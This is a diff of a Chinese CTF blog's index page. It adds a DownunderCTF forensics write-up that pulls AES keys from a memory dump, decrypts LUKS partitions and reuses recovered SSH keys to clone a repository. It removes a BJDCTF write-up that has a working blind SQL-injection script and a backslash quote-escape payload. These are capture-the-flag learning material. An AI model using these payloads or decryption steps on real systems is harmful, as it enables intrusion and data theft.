@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-count">76</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">89</span>
+        <span class="site-state-item-count">92</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,129 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/22/DownunderCTF-Forensic-fix-my-pc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/22/DownunderCTF-Forensic-fix-my-pc/" class="post-title-link" itemprop="url">DownunderCTF-Forensic-fix-my-pc</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-22 17:22:26" itemprop="dateCreated datePublished" datetime="2020-09-22T17:22:26+08:00">2020-09-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-23 11:10:30" itemprop="dateModified" datetime="2020-09-23T11:10:30+08:00">2020-09-23</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/22/DownunderCTF-Forensic-fix-my-pc/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/22/DownunderCTF-Forensic-fix-my-pc/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Downunder CTF 2020的fix-my-pc，给了个rescue.zip，解压是两个bin。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file crash.bin</span><br><span class="line">crash.bin: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style</span><br><span class="line">file system.bin</span><br><span class="line">system.bin: QEMU QCOW2 Image (v3), 824634368 bytes</span><br></pre></td></tr></table></figure> crash.bin大概率是个内存镜像。system.bin是个QCOW2镜像，qemu-nbd挂载就OK。 先挂载QCOW2：modprobe nbd;qemu-nbd --connect=/dev/nbd0 system.bin。 然后fdisk -l查看分区信息： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Disk &#x2F;dev&#x2F;nbd0: 786.43 MiB, 824634368 bytes, 1610614 sectors</span><br><span class="line">Units: sectors of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">Sector size (logical&#x2F;physical): 512 bytes &#x2F; 512 bytes</span><br><span class="line">I&#x2F;O size (minimum&#x2F;optimal): 512 bytes &#x2F; 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Device      Boot   Start     End Sectors   Size Id Type</span><br><span class="line">&#x2F;dev&#x2F;nbd0p1           63  204862  204800   100M 83 Linux</span><br><span class="line">&#x2F;dev&#x2F;nbd0p2       204863 1253438 1048576   512M 83 Linux</span><br><span class="line">&#x2F;dev&#x2F;nbd0p3      1253439 1610613  357175 174.4M 83 Linux</span><br></pre></td></tr></table></figure> mount挂载分区，发现nbd0p2和p3不能挂载，分区类型为crypto_LUKS。尝试挂载：modprobe dm-crypt;modprobe dm-mod;cryptsetup open /dev/nbd2 test2，然后要密码。没密码，那就去内存翻。</p>
+<p>在去内存找密码之前，先看一下LUKS头信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># cryptsetup luksDump &#x2F;dev&#x2F;nbd0p2                                                                                                 root@CTFServer-Vindication</span><br><span class="line">LUKS header information</span><br><span class="line">Version:        2</span><br><span class="line">Epoch:          3</span><br><span class="line">Metadata area:  16384 [bytes]</span><br><span class="line">Keyslots area:  16744448 [bytes]</span><br><span class="line">UUID:           d2ed9bec-ef5f-4482-a03c-57c3b3aabcb3</span><br><span class="line">Label:          (no label)</span><br><span class="line">Subsystem:      (no subsystem)</span><br><span class="line">Flags:          (no flags)</span><br><span class="line"></span><br><span class="line">Data segments:</span><br><span class="line">  0: crypt</span><br><span class="line">        offset: 16777216 [bytes]</span><br><span class="line">        length: (whole device)</span><br><span class="line">        cipher: aes-xts-plain64</span><br><span class="line">        sector: 512 [bytes]</span><br><span class="line"></span><br><span class="line">Keyslots:</span><br><span class="line">  0: luks2</span><br><span class="line">        Key:        512 bits</span><br><span class="line">        Priority:   normal</span><br><span class="line">        Cipher:     aes-xts-plain64</span><br><span class="line">        Cipher key: 512 bits</span><br><span class="line">        PBKDF:      argon2i</span><br><span class="line">        Time cost:  13</span><br><span class="line">        Memory:     249470</span><br><span class="line">        Threads:    1</span><br><span class="line">        Salt:       fa 36 bf 79 a9 69 ec f3 6f 49 aa f0 e7 3b e3 03 </span><br><span class="line">                    a4 2b 1f 9b fd a9 8a b6 ca 02 b8 17 d5 ce cf e3 </span><br><span class="line">        AF stripes: 4000</span><br><span class="line">        AF hash:    sha256</span><br><span class="line">        Area offset:32768 [bytes]</span><br><span class="line">        Area length:258048 [bytes]</span><br><span class="line">        Digest ID:  0</span><br><span class="line">Tokens:</span><br><span class="line">Digests:</span><br><span class="line">  0: pbkdf2</span><br><span class="line">        Hash:       sha256</span><br><span class="line">        Iterations: 160627</span><br><span class="line">        Salt:       dc 1a 99 0b f0 b3 c6 bb e5 61 8a f1 41 ff 31 c7 </span><br><span class="line">                    2c 8f d2 b9 7c bf b6 89 d7 20 b9 34 ef ac ae a7 </span><br><span class="line">        Digest:     a0 a2 bb cf e7 27 41 f8 2b e3 df e9 82 c6 c4 f9 </span><br><span class="line">                    98 0f 85 ff 81 e6 e2 cd be f8 0c 3d 33 1a cc 97 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用的AES加密。binwalk crash.bin发现是Linux的内存镜像，volatility跑不出来。谷歌搜到了一篇<a target="_blank" rel="noopener" href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">这个</a>，试一下findaes工具。跑出来两个AES 256的Key。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Searching &#x2F;home&#x2F;tiaonmmn&#x2F;Challenges_2020_public&#x2F;forensics&#x2F;fix-my-pc&#x2F;crash.bin</span><br><span class="line">Found AES-256 key schedule at offset 0x1bffed68: </span><br><span class="line">ff 98 d7 67 61 14 70 24 eb b0 c8 d4 e1 14 18 14 21 4d 2a 83 d7 93 66 09 37 77 55 e5 18 0a 3c 57 </span><br><span class="line">Found AES-256 key schedule at offset 0x1bffef58: </span><br><span class="line">09 4e 2a df 58 cf b1 7d 85 f0 f6 93 3f 7b 44 ef a0 0a 3c da 7b be 01 87 3e 09 ff 4e e7 a6 05 39</span><br></pre></td></tr></table></figure>
+<p>然后参考<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/119803/how-to-decrypt-luks-with-the-known-master-key">这里</a>解密，要注意的是，AES-XTS-Plain64用的是64位密钥，所以要合并上面两段：<code>echo "0 1048576 crypt aes-xts-plain64 094e2adf58cfb17d85f0f6933f7b44efa00a3cda7bbe01873e09ff4ee7a60539ff98d76761147024ebb0c8d4e1141814214d2a83d7936609377755e5180a3c57 0 /dev/nbd0p2 4096" | dmsetup create luks_volume</code>。没有报错，接着挂载：<code>mount /dev/mapper/luks_volume /mnt</code>，得到一个Linux分区，/home没啥东西，/root文件名乱码，直接cat *，得到下面有趣的东西：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;bob&#x2F;.ash_history </span><br><span class="line">rm .ash_history </span><br><span class="line">shutdown -h now</span><br><span class="line">shutdown</span><br><span class="line">halt</span><br><span class="line">vi &#x2F;etc&#x2F;crypttab</span><br><span class="line">ls</span><br><span class="line">du -h</span><br><span class="line">pwd</span><br><span class="line">ls -la</span><br><span class="line">ls</span><br><span class="line">rm ??b??</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">ls</span><br><span class="line">blkid &gt;&gt; &#x2F;etc&#x2F;crypttab</span><br><span class="line">vim &#x2F;etc&#x2F;crypttab</span><br><span class="line">vi &#x2F;etc&#x2F;crypttab</span><br><span class="line">cd crypttab.d</span><br><span class="line">cd &#x2F;etc&#x2F;crypttab.d</span><br><span class="line">cryptsetup luksOpen &#x2F;dev&#x2F;sda3 crypthome --key-file &#x2F;etc&#x2F;crypttab.d&#x2F;home.key </span><br><span class="line">mount -t ext4 &#x2F;dev&#x2F;sda3 &#x2F;home</span><br><span class="line">ls &#x2F;etc&#x2F;crypttab.d&#x2F;home.key</span><br><span class="line">rc-service sshd start</span><br></pre></td></tr></table></figure>
+<p>发现又来一个cryptsetup，我们还有一个分区/dev/nbd0p3没看呢。根据提示，直接解密：<code>cryptsetup luksOpen /dev/nbd0p3 crypthome --key-file /mnt/etc/home.key</code>，<code>mount /dev/mapper/nbd0p3 /mnt1</code>，然后看/mnt1文件，发现有.ssh目录，存在id_rsa id_rsa.pub known_hosts，SSH免密登录。看.ash_history，发现有github的Repo。那就把.ssh目录的文件拷到我们机器上的.ssh目录下，然后git clone git@github.com:cornochips/configs。得到10个file*.txt，但是都没用。git log发现有大量提交日志，一点点翻文件找到了。</p>
+
+
+    <div id="aplayer-HevGGXkg" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="424262056" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{548c9969-8cb1-4aef-89fa-4b8548e17b25}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1326,127 +1449,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-简单注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-08-25 18:21:01" itemprop="dateCreated datePublished" datetime="2020-08-25T18:21:01+08:00">2020-08-25</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-08-26 17:32:17" itemprop="dateModified" datetime="2020-08-26T17:32:17+08:00">2020-08-26</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>901</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>BJDCTF 2nd的简单注入。</p>
-<p>明显注入题。</p>
-<p>robots.txt发现有hint.txt，hint.txt里给出查询语句<code>select * from users where username='$_POST["username"]' and password='$_POST["password"]';</code>，并且告诉我们要得到密码。</p>
-<p>过滤了一大堆东西，包括<code>select</code> <code>and</code> <code>&amp;</code> <code>"</code> <code>'</code> <code>=</code> <code>-</code> 。</p>
-<p>然后介绍一种新的Payload，如果我们给username传<code>admin\</code>会怎样？<code>select * from users where username='admin\' and password='safasfd'</code>。<code>\</code>转义符号会吃掉一个单引号，导致username实际上等于<code>admin' and password=</code>，我们就逃逸出一个单引号。然后盲注好了。</p>
-<p>很明确，要select password from users。那就很简单了，password构造<code>or ascii(substr((password),1,1))&gt;32</code>，，盲注跑脚本即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://06f46304-b570-4801-aa2d-6641e91f487b.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        c=requests.post(url=url,data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot; or ascii(substring(password,&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.format(a,b)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;stronger&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> c.text:</span><br><span class="line">            flag+=chr(b)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-    <div id="aplayer-aBQskzmZ" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="4875306" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{d4131ee5-def8-4c8b-9778-1bab77190f59}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1503,14 +1505,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">320k</span>
+    <span title="站点总字数">323k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:51</span>
+    <span title="站点阅读时长">4:54</span>
   </span>
 </div>
 <div class="busuanzi-count">
